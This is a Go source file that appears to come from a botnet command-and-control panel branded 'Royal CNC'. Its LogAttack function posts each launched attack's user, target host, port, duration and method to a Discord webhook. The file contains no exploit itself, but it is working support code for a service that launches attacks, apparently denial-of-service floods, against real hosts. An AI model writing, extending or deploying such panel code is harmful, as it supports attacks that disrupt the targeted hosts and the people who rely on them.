package discord

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"time"
	"webserver/src/config"
)

func LogAttack(username string, host string, port string, tm string, method string) error {
	year, month, day := time.Now().Date()
	date := fmt.Sprintf("%d/%s/%d", day, month, year)
	data, err := json.Marshal(Model{
		Embeds: []Embeds{
			{
				Title:       "New Attacks Started On Royal CNC!",
				Description: fmt.Sprintf("Date: %s", date),
				Color:       000,
				Fields: []Fields{
					{
						Name:   "**Username**",
						Value:  username,
						Inline: true,
					},
					{
						Name:   "**Host**",
						Value:  host,
						Inline: true,
					},
					{
						Name:   "**Port**",
						Value:  port,
						Inline: true,
					},
					{
						Name:   "**Duration**",
						Value:  tm + "   ",
						Inline: true,
					},
					{
						Name:   "**Method**",
						Value:  method,
						Inline: true,
					},
				},
				Author: Author{
					Name: "Royal CNC Logs",
				},
				Footer: Footer{
					Text:    fmt.Sprintf("Developer: t.me/Royaloakap"),
					IconURL: config.Cfg.Discord.Image,
				},
				Thumbnail: Thumbnail{
					URL: config.Cfg.Discord.Image,
				},
			},
		},
	})
	if err != nil {
		return err
	}
	rq, err := http.Post(config.Cfg.Discord.Webhook, "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}

	defer rq.Body.Close()

	if rq.StatusCode > 204 {
		log.Printf("(discord/err) %s", err)
		read, err := ioutil.ReadAll(rq.Body)
		if err != nil {
			return err
		}
		fmt.Printf("(dcs/err) %s\r\n", string(read))
	}
	return nil
}
